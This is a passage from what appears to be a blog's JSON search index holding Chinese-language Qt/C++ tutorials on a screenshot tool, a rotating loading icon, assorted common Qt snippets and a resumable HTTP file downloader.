x %6)&quot;) .arg(lx).arg(ly).arg(lx + w).arg(ly + h).arg(w).arg(h)); &#125; else//在截图矩形上边接近屏幕上边时，提示在截图矩形的上边的下面 &#123; painter.drawText(lx + 2, ly + 12, tr(&quot;截图范围(%1,%2) - (%3,%4) 截图大小：(%5 x %6)&quot;) .arg(lx).arg(ly).arg(lx + w).arg(ly + h).arg(w).arg(h)); &#125; &#125; //实时显示鼠标的位置 painter.drawText(cursor().pos().x(), cursor().pos().y(), tr(&quot;(%1,%2)&quot;) .arg(cursor().pos().x()).arg(cursor().pos().y())); &#125; void Screen::showEvent(QShowEvent *) //--窗体show事件 &#123; //设置透明度实现模糊背景 setWindowOpacity(0.7); &#125; void Screen::saveScreenOther() &#123; QString fileName = QFileDialog::getSaveFileName(this, &quot;截图另存为&quot;, &quot;&quot;, &quot;Image (*.jpg *.png *.bmp)&quot;); if (fileName.length() &gt; 0) &#123; fullScreen.copy(*rect).save(fileName,&quot;bmp&quot;); close(); &#125; &#125; void Screen::grapFullScreen() &#123; endPos.setX(-1);//此时避免画截图矩形 QString fileName = QFileDialog::getSaveFileName(this, &quot;保存全屏截图&quot;, &quot;&quot;, &quot;JPEG Files (*.jpg)&quot;); if (fileName.length() &gt; 0) &#123; fullScreen.save(fileName, &quot;jpg&quot;); close(); &#125; this-&gt;hide(); &#125; void Screen::keyPressEvent(QKeyEvent *e) //按键事件 &#123; /// Esc 键退出截图; if (e-&gt;key() == Qt::Key_Escape) &#123; hide(); &#125;///CTRL+C 复制 else if(e-&gt;key() == Qt::Key_C &amp;&amp; e-&gt;modifiers() == Qt::ControlModifier) &#123; QGuiApplication::clipboard()-&gt;setPixmap(fullScreen.copy(*rect)); &#125;///截图另存为(ALT+C) else if(e-&gt;key() == Qt::Key_C &amp;&amp; e-&gt;modifiers() == Qt::AltModifier) &#123; saveScreenOther(); &#125;///全屏截图(ALT+A) else if(e-&gt;key() == Qt::Key_A &amp;&amp; e-&gt;modifiers() == Qt::AltModifier) &#123; grapFullScreen(); &#125; else &#123; e-&gt;ignore(); &#125; &#125; widget.cpp文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;#include &lt;QMessageBox&gt;#include &lt;QDesktopWidget&gt;#include &lt;QFileDialog&gt;#include &lt;QScreen&gt;#include &lt;QString&gt;#include &lt;QDebug&gt;#include &lt;QPoint&gt;#include &lt;QTime&gt;#include &quot;screen.h&quot; Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); beginPos = this-&gt;pos(); leftPress = false; this-&gt;setProperty(&quot;CanMove&quot;, true); //实现无边框 (Qt::FramelessWindowHint去边框) Qt::WindowStaysOnTopHint 窗体置顶 防止拖到任务栏下面 this-&gt;setWindowFlags(Qt::FramelessWindowHint | Qt::WindowSystemMenuHint | Qt::WindowMinMaxButtonsHint|Qt::WindowStaysOnTopHint);&#125; Widget::~Widget()&#123; delete ui;&#125; void Widget::mousePressEvent(QMouseEvent *e) //--鼠标按下事件&#123; if (e-&gt;button() == Qt::LeftButton)//鼠标左键按下 &#123; leftPress = true; beginPos = e-&gt;pos();//鼠标相对窗体的位置 &#125;&#125;void Widget::mouseMoveEvent(QMouseEvent *e) //--鼠标移动事件&#123; if (leftPress) &#123;//当前鼠标相对窗体的位置-刚按下左键时的相对位置=鼠标移动的大小 move(e-&gt;pos() - beginPos + this-&gt;pos()); // 鼠标移动的大小+窗体原来的位置=窗体移动后的位置 &#125; &#125;void Widget::mouseReleaseEvent(QMouseEvent *e) //--鼠标释放（松开）事件&#123; leftPress = false;&#125;void Widget::enterEvent(QEvent *e) //--鼠标进入事件&#123; if(this-&gt;pos().y()&lt;=0)//鼠标进入并且已经贴边 &#123; move(pos().x(),0);//弹出整个窗体 &#125; &#125;void Widget::leaveEvent(QEvent *e) //--鼠标离开事件&#123; if(this-&gt;pos().y()&lt;=0)//窗体贴在屏幕上边 &#123; move(pos().x(),-29);//贴边 &#125;&#125; void Widget::on_pushButton_2_clicked()&#123; //截图之前隐去窗体，不然截图之中就会有窗体的存在 if( windowState() != Qt::WindowMinimized ) &#123; setWindowState( Qt::WindowMinimized );//最小化父窗体 &#125; //延时等待父窗体最小化 延时250毫秒 QTime _Timer = QTime::currentTime().addMSecs(250); while( QTime::currentTime() &lt; _Timer ) &#123; QCoreApplication::processEvents(QEventLoop::AllEvents, 100); &#125; //先获取全屏截图，再拉上幕布 Screen *m = new Screen(); m-&gt;fullScreen = QPixmap::grabWindow(QApplication::desktop()-&gt;winId()); m-&gt;showFullScreen(); &#125; void Widget::on_pushButton_clicked()&#123; //获取全屏截图 QPixmap p = QPixmap::grabWindow(QApplication::desktop()-&gt;winId()); //打开文件对话框 QString fileName = QFileDialog::getSaveFileName(this, &quot;文件另存为&quot;,&quot;&quot;,tr(&quot;Config Files (*.bmp)&quot;)); //保存截图 if(fileName.length() &gt; 0 &amp;&amp; p.save(fileName,&quot;bmp&quot;)) &#123; QMessageBox::information(this, &quot;提示&quot;, &quot;保存成功!&quot;,QMessageBox::Ok); &#125; &#125; void Widget::on_pushButton_4_clicked()&#123; if( windowState() != Qt::WindowMinimized ) &#123; setWindowState( Qt::WindowMinimized );//最小化窗体 &#125;&#125; void Widget::on_pushButton_3_clicked()&#123; this-&gt;close();//关闭窗体&#125; main.cpp文件 12345678910111213#include &quot;widget.h&quot;#include &lt;QApplication&gt;#include &lt;screen.h&gt;#include &lt;QDebug&gt;int main(int argc, char *argv[])&#123; QApplication a(argc, argv); Widget w; w.show(); return a.exec();&#125; 七、注意事项 ****update()触发***paintEvent重绘事件，不是直接调用*paintEvent()。","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"截图","slug":"截图","permalink":"http://example.com/tags/%E6%88%AA%E5%9B%BE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt图片旋转","date":"2023-10-27T01:24:02.243Z","path":"B_Code/Qt/Qt图片旋转/","text":"Qt loading 样式 图片旋转图片旋转可以使用paintevent时间，也可以使用过滤器实现。如下为使用过滤器的方式实现图片旋转。 首先在 UI 中绘制 一个 QLabel 用于承载旋转图片。 1ui-&gt;labelLoadIcon 然后给载体安装过滤器事件，保证其可触发的状态 1ui-&gt;labelLoadIcon-&gt;installEventFilter(this); 写过滤器要实现的功能，旋转 123456789101112131415161718bool QAuthInit::eventFilter(QObject* watched, QEvent* event)&#123; if (watched == ui-&gt;labelLoadIcon &amp;&amp; event-&gt;type() == QEvent::Paint &amp;&amp; !this-&gt;parentWidget()-&gt;isHidden()) &#123; QImage loading = QImage(&quot;:/loading.jpg&quot;); QPainter painter_inner(ui-&gt;labelLoadIcon); painter_inner.setPen(Qt::NoPen); painter_inner.setBrush(Qt::NoBrush); painter_inner.setRenderHint(QPainter::SmoothPixmapTransform); painter_inner.translate(loading.width() / qreal(2) + 0, loading.height() / qreal(2) + 0); //设置旋转中心 painter_inner.rotate(-m_nAngle_ring); //旋转 painter_inner.translate(-(loading.width() / qreal(2) + 0), -(loading.height() / qreal(2) + 0)); //将原点复位 painter_inner.drawImage(QPointF(0, 0), loading); &#125; // 事件仍然抛给QT return QWidget::eventFilter(watched, event);&#125; 定时调用，使过滤器中旋转的角度变化，从而达到旋转的效果 1234567QTimer* timerLoading = new QTimer(this);timerLoading-&gt;setInterval(5);connect(timerLoading, &amp;QTimer::timeout, this, &amp;LoadingWidget::onTimeOut); // 在槽函数中修改 m_nAngle_ring 的值timerLoading-&gt;start(); 定时器槽函数 1234567891011121314void LoadingWidget::onTimeOut()&#123; if (!this-&gt;parentWidget()-&gt;isHidden()) &#123; //每次间隔转2度,也就是说转一圈需要180次 if (m_nAngle_ring == 360) &#123; m_nAngle_ring = 0; &#125; m_nAngle_ring += 2; ui-&gt;labelLoadIcon-&gt;update(); &#125; &#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"旋转","slug":"旋转","permalink":"http://example.com/tags/%E6%97%8B%E8%BD%AC/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt常用基础代码汇总","date":"2023-10-27T01:24:02.243Z","path":"B_Code/Qt/Qt开发经验/Qt常用基础代码汇总/","text":"[toc] 1、show() 与 exec()show显示的是非模态对话框；exec显示的是模态对话框。 2、设置无边框窗口1this-&gt;setWindowFlags(Qt::FramelessWindowHint); //设置为无边框窗口 3、设置窗体透明1this-&gt;setAttribute(Qt::WA_TranslucentBackground); //设置窗体透明 4、Qt字符串转换123456789101112131415#ifdef UNICODE #define QStringToTCHAR(x) (wchar_t*) x.utf16()#define PQStringToTCHAR(x) (wchar_t*) x-&gt;utf16()#define TCHARToQString(x) QString::fromUtf16((x))#define TCHARToQStringN(x,y) QString::fromUtf16((x),(y)) #else #define QStringToTCHAR(x) x.local8Bit().constData()#define PQStringToTCHAR(x) x-&gt;local8Bit().constData()#define TCHARToQString(x) QString::fromLocal8Bit((x))#define TCHARToQStringN(x,y) QString::fromLocal8Bit((x),(y)) #endif 5、Qss读取123456789101112131415161718192021void Widget::InitStyle(int i)&#123; m_LCD_Hour-&gt;setStyleSheet(&quot; font: 18px black;&quot;); if(i != 0) &#123; QFile file(QString(&quot;:/Assert/qss/style%1.qss&quot;).arg(i)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close(); return; &#125; // m_LCD_Min-&gt;setStyleSheet(&quot;color: black; &quot;); // m_LCD_Sec-&gt;setStyleSheet(&quot;color: black; &quot;); QFile file(QString(&quot;:/Assert/qss/main.qss&quot;)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close();&#125; 6、QWidget自动列宽12// TreeWidget 自动列宽 add by mingming.shi 2021-10-23ui.treeWidget-&gt;header()-&gt;setSectionResizeMode(QHeaderView::ResizeToContents); 7、Qss写法参考QSS单独设置某控件样式 8、Qt正则表达式123456789101112131415161718QRegExp rx(&quot;\\\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\b&quot;); //IP的正则表达式if(!rx.exactMatch(m_lineEdit-&gt;text()))&#123; QMessageBox::critical(this, tr(&quot;Error&quot;), tr(&quot;IP WRONG.\\n&quot; &quot;Please Make Sure Input Correct IP!&quot;), QMessageBox::Ok); return ;&#125;if(m_lineEdit-&gt;text().toInt() &lt;= 0)&#123; QMessageBox::information(this, tr(&quot;Info&quot;), tr(&quot;IP Correct.\\n&quot; &quot;Input Correct IP is Saved!&quot;), QMessageBox::Ok); return;&#125; 9、字体相关 查询系统支持的字体 1234QFontDatabase database;foreach (const QString &amp;family, database.families()) &#123; qDebug()&lt;&lt;family;&#125; 设置全局字体font内容为family查询到的字体名称12QFont font(&quot;family&quot;);QApplication::setFont(font); 外部加载字体 字体支持ttc或ttf格式加载； 使用addApplicationFont可以为系统路径，也可以资源文件。123456789int fontId = QFontDatabase::addApplicationFont(&quot;font.ttc&quot;);QStringList fontIDs = QFontDatabase::applicationFontFamilies(fontId);if (! fontIDs.isEmpty()) &#123; QFont font(fontIDs.first()); QApplication::setFont(font);&#125;else &#123; qDebug()&lt;&lt;&quot;Failed to load font.&quot;;&#125; 10. Qt锁123456789101112131415161718QMutex mutex;int number = 6;void method1()&#123; mutex.lock(); number *= 5; number /= 4; mutex.unlock();&#125;void method2()&#123; mutex.lock(); number *= 3; number /= 2; mutex.unlock();&#125; 11、 计时器 定时器计时器123456789QTimer *timer = new QTimer;connect(timer, SIGNAL(timeout()), this, SLOT(slotTimeOut()));// 或者connect(timer, &amp;QTimer::timeout, this, [=]()mutable&#123; slotTimeOut();&#125;);timer-&gt;start(1000); 单次定时器1234// 3秒后 启用下载按钮QTimer::singleShot(3 * 1000, this, [=]() &#123; ui-&gt;pushBtnUpgrade-&gt;setDisabled(false); &#125;); 12、乱码问题在头文件添加以下代码即可。 123#if defined(_MSC_VER) &amp;&amp; (_MSC_VER &gt;= 1600) #pragma execution_character_set(&quot;utf-8&quot;)#endif 13、 QTextBrower 设置字体颜色12345#define TEXT_COLOR_RED(STRING) &quot;&lt;font color=red&gt;&quot; + STRING + &quot;&lt;/font&gt;&quot; &quot;&lt;font color=black&gt; &lt;/font&gt;&quot;#define TEXT_COLOR_BLUE(STRING) &quot;&lt;font color=blue&gt;&quot; + STRING + &quot;&lt;/font&gt;&quot; &quot;&lt;font color=black&gt; &lt;/font&gt;&quot;#define TEXT_COLOR_GREEN(STRING) &quot;&lt;font color=green&gt;&quot; + STRING + &quot;&lt;/font&gt;&quot; &quot;&lt;font color=black&gt; &lt;/font&gt;&quot;ui-&gt;textBrowser-&gt;setText(TEXT_COLOR_BLUE(content)); 14 Qt http下载网络中断问题 使用 QNetworkAccessManager 下载文件时，网络中断返回的异常吗仍然是200，需要判断 slotFinished 函数中需要判断 error 的状态来判断下载是否正常 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768void QHttpDownloadObject::Init()&#123; QNetworkAccessManager *m_pManager = new QNetworkAccessManager(this); m_pOnlinemanager = new QNetworkConfigurationManager(this); // (&quot;ftp&quot;, &quot;file&quot;, &quot;qrc&quot;, &quot;http&quot;, &quot;https&quot;, &quot;data&quot;) qDebug() &lt;&lt; m_pManager-&gt;supportedSchemes(); m_pManager-&gt;setNetworkAccessible(QNetworkAccessManager::Accessible); QNetworkConfigurationManager manager; m_pManager-&gt;setConfiguration(manager.defaultConfiguration()); connect(m_pManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(slotRequestFinished(QNetworkReply*)));&#125;void QHttpDownloadObject::PerformRequest(QString strUrl)&#123; QNetworkRequest request; request.setUrl(QUrl(strUrl)); request.setHeader(QNetworkRequest::ContentTypeHeader, &quot;application/x-www-form-urlencoded&quot;); m_fileTmp.setFileName(m_DestFilePath); m_fileTmp.open(QIODevice::Append); m_pReply = m_pManager-&gt;get(request); // get 方式 connect(m_pReply, &amp;QNetworkReply::readyRead, this, &amp;QHttpDownloadObject::onReadyRead); connect(m_pReply, &amp;QNetworkReply::downloadProgress, this, &amp;QHttpDownloadObject::downloadProgress); // 使用当前接口判断下载时否异常 connect(m_pReply, static_cast&lt;void(QNetworkReply::*)(QNetworkReply::NetworkError)&gt;(&amp;QNetworkReply::error), this, &amp;QHttpDownloadObject::onError);&#125;void QHttpDownloadObject::slotRequestFinished(QNetworkReply *reply)&#123; disconnect(m_pReply, SIGNAL(downloadProgress(qint64, qint64)), this, SIGNAL(downloadProgress(qint64, qint64))); if (m_fileTmp.isOpen()) &#123; m_fileTmp.close(); &#125; // 获取响应的信息，状态码为200表示正常 QVariant statusCode = reply-&gt;attribute(QNetworkRequest::HttpStatusCodeAttribute); QString strError = reply-&gt;errorString(); QNetworkReply::NetworkError error = reply-&gt;error(); qDebug() &lt;&lt; &quot;+++++++++&quot; &lt;&lt; statusCode &lt;&lt; strError &lt;&lt; error; // QVariant(int, 200) &quot;Connection closed&quot; QNetworkReply::NetworkError(RemoteHostClosedError) if (statusCode.toInt() &gt;= 400 || error != QNetworkReply::NoError) &#123; QLOG_INFO() &lt;&lt; &quot;无法下载文件，错误状态码:&quot; &lt;&lt; statusCode &lt;&lt; &quot;错误信息:&quot; &lt;&lt; strError &lt;&lt; error; emit sigDownloadFinished(DOWNLOAD_CODE_NETBAD, QString(ERRORTITLE_APPACCESS_NETFAULT).arg(strError)); &#125; else &#123; emit sigDownloadFinished(statusCode.toInt(), strError); &#125; reply-&gt;close(); reply-&gt;deleteLater(); m_pManager-&gt;deleteLater(); m_pOnlinemanager-&gt;deleteLater();&#125; 15 管理员运行程序 管理员运行程序，限定在MSVC编译器，在项目pro文件中增加如下代码。 12QMAKE_LFLAGS += /MANIFESTUAC:&quot;level=&#x27;requireAdministrator&#x27; uiAccess=&#x27;false&#x27;&quot; #以管理员运行QMAKE_LFLAGS += /SUBSYSTEM:WINDOWS,&quot;5.01&quot; #VS2013 在XP运行 16 QLabel 点击事件重写 QLabel 事件 123456void QCycleProgress::mousePressEvent(QMouseEvent* event)&#123; emit clicked(); QLabel::mousePressEvent(event);&#125; 17 程序防重入123456789101112131415161718192021222324#include &quot;qrcode.h&quot;#include &lt;QSharedMemory&gt;#include &lt;QApplication&gt;int main(int argc, char *argv[])&#123; QApplication a(argc, argv); //创建运行时只允许存在一个程序 static QSharedMemory *shareMem = new QSharedMemory(&quot;SingleAPP&quot;); //判断如果存在存直接退出 if(!shareMem-&gt;create(1))&#123; qApp-&gt;quit(); return -1; &#125;else&#123; int result = -1; while (result !=0) &#123; Create_qrcode w; w.setWindowIcon(QIcon(&quot;:/images/main_logo.ico&quot;)); w.show(); result= a.exec(); //!退出时如果为零，正常退出，否则重启程序 &#125; return result; &#125;&#125; 18 弹窗显示在屏幕中间使用 12345678void QTrayTooltipForm::show()&#123; placeTip(QCursor::pos()); UpdateStatus(); return QWidget::show();&#125; 1234567891011121314151617181920void QTrayTooltipForm::placeTip(const QPoint&amp; pos)&#123; QRect screen = QApplication::desktop()-&gt;screenGeometry(QApplication::desktop()-&gt;screenNumber(pos)); QPoint p = pos; p += QPoint(2,16); if (p.x() + this-&gt;width() &gt; screen.x() + screen.width()) p.rx() -= 4 + this-&gt;width(); if (p.y() + this-&gt;height() &gt; screen.y() + screen.height()) p.ry() -= 24 + this-&gt;height(); if (p.y() &lt; screen.y()) p.setY(screen.y()); if (p.x() + this-&gt;width() &gt; screen.x() + screen.width()) p.setX(screen.x() + screen.width() - this-&gt;width()); if (p.x() &lt; screen.x()) p.setX(screen.x()); if (p.y() + this-&gt;height() &gt; screen.y() + screen.height()) p.setY(screen.y() + screen.height() - this-&gt;height()); this-&gt;move(p);&#125;","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"Qt开发经验","slug":"B-Code/Qt/Qt开发经验","permalink":"http://example.com/categories/B-Code/Qt/Qt%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"}]},{"title":"Qt快捷键以及全局注册","date":"2023-10-27T01:24:02.242Z","path":"B_Code/Qt/Qt全局注册快捷键/","text":"","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"【Qt】Qt Http 下载（转载）","date":"2023-10-27T01:24:02.241Z","path":"B_Code/Qt/QtHttp下载/","text":"QT之HTTP请求下载标签： Qt HTTP 简述最近在研究了一下用Qt 的方法来实现http下载，Qt 中的Http请求主要用到了QNetworkAccessManager、QNetworkReply、QNetworkRequest 这三块。本篇文章主要叙述如何用Qt 的方法进行HTTP 请求下载文件，能够支持****断点续传****（断点续传即能够手动停止下载，下次可以从已经下载的部分开始继续下载未完成的部分，而没有必要从头开始上传下载），并且实时更新下载信息。整体代码考虑十分周到，对各种情况也做了相应的处理，并且有通俗易懂的注释。好了，代码走起！ 代码之路在讲解代码之前先看一下效果图： 效果： 从图中可以看出点击start按钮，进行下载，stop按钮暂停当前下载，close按钮停止当前下载，并删除已经下载的临时文件，并将所有参数重置， 这里界面中下载链接输入框为空是因为我在代码中默认了url，也可以在输入框中输入url进行下载。 代码主要包含两个部分： 1、DownLoadManager ： 用来请求下载，向界面传递下载信息，并将下载的内容保存到文件中 2、MyHttpDownload ： 用来接收下载链接，利用DownLoadManager进行下载，更新界面，并对当前下载进行操作（包括：开始、暂停、停止下载）。 1、DOWNLOADMANAGER123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197#include &quot;downloadmanager.h&quot;#include &lt;QFile&gt;#include &lt;QDebug&gt;#include &lt;QFileInfo&gt;#include &lt;QDir&gt; #define DOWNLOAD_FILE_SUFFIX &quot;_tmp&quot; DownLoadManager::DownLoadManager(QObject *parent) : QObject(parent) , m_networkManager(NULL) , m_url(QUrl(&quot;&quot;)) , m_fileName(&quot;&quot;) , m_isSupportBreakPoint(false) , m_bytesReceived(0) , m_bytesTotal(0) , m_bytesCurrentReceived(0) , m_isStop(true)&#123; m_networkManager = new QNetworkAccessManager(this);&#125; DownLoadManager::~DownLoadManager()&#123;&#125; // 设置是否支持断点续传;void DownLoadManager::setDownInto(bool isSupportBreakPoint)&#123; m_isSupportBreakPoint = isSupportBreakPoint;&#125; // 获取当前下载链接;QString DownLoadManager::getDownloadUrl()&#123; return m_url.toString();&#125; // 开始下载文件，传入下载链接和文件的路径;void DownLoadManager::downloadFile(QString url , QString fileName)&#123; // 防止多次点击开始下载按钮，进行多次下载，只有在停止标志变量为true时才进行下载; if (m_isStop) &#123; m_isStop = false; m_url = QUrl(url); // 这里可用从url中获取文件名，但不是对所有的url都有效;// QString fileName = m_url.fileName(); // 将当前文件名设置为临时文件名，下载完成时修改回来; m_fileName = fileName + DOWNLOAD_FILE_SUFFIX; // 如果当前下载的字节数为0那么说明未下载过或者重新下载 // 则需要检测本地是否存在之前下载的临时文件，如果有则删除 if (m_bytesCurrentReceived &lt;= 0) &#123; removeFile(m_fileName); &#125; QNetworkRequest request; request.setUrl(m_url); // 如果支持断点续传，则设置请求头信息 if (m_isSupportBreakPoint) &#123; QString strRange = QString(&quot;bytes=%1-&quot;).arg(m_bytesCurrentReceived); request.setRawHeader(&quot;Range&quot;, strRange.toLatin1()); &#125; // 请求下载; m_reply = m_networkManager-&gt;get(request); connect(m_reply, SIGNAL(downloadProgress(qint64, qint64)), this, SLOT(onDownloadProgress(qint64, qint64))); connect(m_reply, SIGNAL(readyRead()), this, SLOT(onReadyRead())); connect(m_reply, SIGNAL(finished()), this, SLOT(onFinished())); connect(m_reply, SIGNAL(error(QNetworkReply::NetworkError)), this, SLOT(onError(QNetworkReply::NetworkError))); &#125; &#125; // 下载进度信息;void DownLoadManager::onDownloadProgress(qint64 bytesReceived, qint64 bytesTotal)&#123; if (!m_isStop) &#123; m_bytesReceived = bytesReceived; m_bytesTotal = bytesTotal; // 更新下载进度;(加上 m_bytesCurrentReceived 是为了断点续传时之前下载的字节) emit signalDownloadProcess(m_bytesReceived + m_bytesCurrentReceived, m_bytesTotal + m_bytesCurrentReceived); &#125; &#125; // 获取下载内容，保存到文件中;void DownLoadManager::onReadyRead()&#123; if (!m_isStop) &#123; QFile file(m_fileName); if (file.open(QIODevice::WriteOnly | QIODevice::Append)) &#123; file.write(m_reply-&gt;readAll()); &#125; file.close(); &#125; &#125; // 下载完成;void DownLoadManager::onFinished()&#123; m_isStop = true; // http请求状态码; QVariant statusCode = m_reply-&gt;attribute(QNetworkRequest::HttpStatusCodeAttribute); if (m_reply-&gt;error() == QNetworkReply::NoError) &#123; // 重命名临时文件; QFileInfo fileInfo(m_fileName); if (fileInfo.exists()) &#123; int index = m_fileName.lastIndexOf(DOWNLOAD_FILE_SUFFIX); QString realName = m_fileName.left(index); QFile::rename(m_fileName, realName); &#125; &#125; else &#123; // 有错误输出错误; QString strError = m_reply-&gt;errorString(); qDebug() &lt;&lt; &quot;__________&quot; + strError; &#125; emit signalReplyFinished(statusCode.toInt());&#125; // 下载过程中出现错误，关闭下载，并上报错误，这里未上报错误类型，可自己定义进行上报;void DownLoadManager::onError(QNetworkReply::NetworkError code)&#123; QString strError = m_reply-&gt;errorString(); qDebug() &lt;&lt; &quot;__________&quot; + strError; closeDownload(); emit signalDownloadError();&#125; // 停止下载工作;void DownLoadManager::stopWork()&#123; m_isStop = true; if (m_reply != NULL) &#123; disconnect(m_reply, SIGNAL(downloadProgress(qint64, qint64)), this, SLOT(onDownloadProgress(qint64, qint64))); disconnect(m_reply, SIGNAL(readyRead()), this, SLOT(onReadyRead())); disconnect(m_reply, SIGNAL(finished()), this, SLOT(onFinished())); disconnect(m_reply, SIGNAL(error(QNetworkReply::NetworkError)), this, SLOT(onError(QNetworkReply::NetworkError))); m_reply-&gt;abort(); m_reply-&gt;deleteLater(); m_reply = NULL; &#125;&#125; // 暂停下载按钮被按下,暂停当前下载;void DownLoadManager::stopDownload()&#123; // 这里m_isStop变量为了保护多次点击暂停下载按钮，导致m_bytesCurrentReceived 被不停累加; if (!m_isStop) &#123; //记录当前已经下载字节数 m_bytesCurrentReceived += m_bytesReceived; stopWork(); &#125; &#125; // 重置参数;void DownLoadManager::reset()&#123; m_bytesCurrentReceived = 0; m_bytesReceived = 0; m_bytesTotal = 0;&#125; // 删除文件;void DownLoadManager::removeFile(QString fileName)&#123; // 删除已下载的临时文件; QFileInfo fileInfo(fileName); if (fileInfo.exists()) &#123; QFile::remove(fileName); &#125;&#125; // 停止下载按钮被按下，关闭下载，重置参数，并删除下载的临时文件;void DownLoadManager::closeDownload()&#123; stopWork(); reset(); removeFile(m_fileName);&#125; 2、MYHTTPDOWNLOAD123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238#include &quot;myhttpdownload.h&quot;#include &quot;downloadmanager.h&quot;#include &lt;QDebug&gt; #define UNIT_KB 1024 //KB#define UNIT_MB 1024*1024 //MB#define UNIT_GB 1024*1024*1024 //GB #define TIME_INTERVAL 300 //0.3s MyHttpDownload::MyHttpDownload(QWidget *parent) : QWidget(parent) , m_downloadManager(NULL) , m_url(&quot;&quot;) , m_timeInterval(0) , m_currentDownload(0) , m_intervalDownload(0)&#123; ui.setupUi(this); initWindow();&#125; MyHttpDownload::~MyHttpDownload()&#123; &#125; void MyHttpDownload::initWindow()&#123; ui.progressBar-&gt;setValue(0); connect(ui.pButtonStart, SIGNAL(clicked()), this, SLOT(onStartDownload())); connect(ui.pButtonStop, SIGNAL(clicked()), this, SLOT(onStopDownload())); connect(ui.pButtonClose, SIGNAL(clicked()), this, SLOT(onCloseDownload())); // 进度条设置样式; ui.progressBar-&gt;setStyleSheet(&quot;\\ QProgressBar\\ &#123;\\ border-width: 0 10 0 10;\\ border-left: 1px, gray;\\ border-right: 1px, gray;\\ border-image:url(:/Resources/progressbar_back.png);\\ &#125;\\ QProgressBar::chunk\\ &#123;\\ border-width: 0 10 0 10;\\ border-image:url(:/Resources/progressbar.png);\\ &#125;&quot;);&#125; // 开始下载;void MyHttpDownload::onStartDownload()&#123; // 从界面获取下载链接; m_url = ui.downloadUrl-&gt;text(); if (m_downloadManager == NULL) &#123; m_downloadManager = new DownLoadManager(this); connect(m_downloadManager , SIGNAL(signalDownloadProcess(qint64, qint64)), this, SLOT(onDownloadProcess(qint64, qint64))); connect(m_downloadManager, SIGNAL(signalReplyFinished(int)), this, SLOT(onReplyFinished(int))); &#125; // 这里先获取到m_downloadManager中的url与当前的m_url 对比，如果url变了需要重置参数,防止文件下载不全; QString url = m_downloadManager-&gt;getDownloadUrl(); if (url != m_url) &#123; m_downloadManager-&gt;reset(); &#125; m_downloadManager-&gt;setDownInto(true); m_downloadManager-&gt;downloadFile(m_url, &quot;F:/MyHttpDownload/MyDownloadFile.zip&quot;); m_timeRecord.start(); m_timeInterval = 0; ui.labelStatus-&gt;setText(QStringLiteral(&quot;正在下载&quot;));&#125; // 暂停下载;void MyHttpDownload::onStopDownload()&#123; ui.labelStatus-&gt;setText(QStringLiteral(&quot;停止下载&quot;)); if (m_downloadManager != NULL) &#123; m_downloadManager-&gt;stopDownload(); &#125; ui.labelSpeed-&gt;setText(&quot;0 KB/S&quot;); ui.labelRemainTime-&gt;setText(&quot;0s&quot;);&#125; // 关闭下载;void MyHttpDownload::onCloseDownload()&#123; m_downloadManager-&gt;closeDownload(); ui.progressBar-&gt;setValue(0); ui.labelSpeed-&gt;setText(&quot;0 KB/S&quot;); ui.labelRemainTime-&gt;setText(&quot;0s&quot;); ui.labelStatus-&gt;setText(QStringLiteral(&quot;关闭下载&quot;)); ui.labelCurrentDownload-&gt;setText(&quot;0 B&quot;); ui.labelFileSize-&gt;setText(&quot;0 B&quot;);&#125; // 更新下载进度;void MyHttpDownload::onDownloadProcess(qint64 bytesReceived, qint64 bytesTotal)&#123; // 输出当前下载进度; // 用到除法需要注意除0错误; qDebug() &lt;&lt; QString(&quot;%1&quot;).arg(bytesReceived * 100 / bytesTotal + 1); // 更新进度条; ui.progressBar-&gt;setMaximum(bytesTotal); ui.progressBar-&gt;setValue(bytesReceived); // m_intervalDownload 为下次计算速度之前的下载字节数; m_intervalDownload += bytesReceived - m_currentDownload; m_currentDownload = bytesReceived; uint timeNow = m_timeRecord.elapsed(); // 超过0.3s更新计算一次速度; if (timeNow - m_timeInterval &gt; TIME_INTERVAL) &#123; qint64 ispeed = m_intervalDownload * 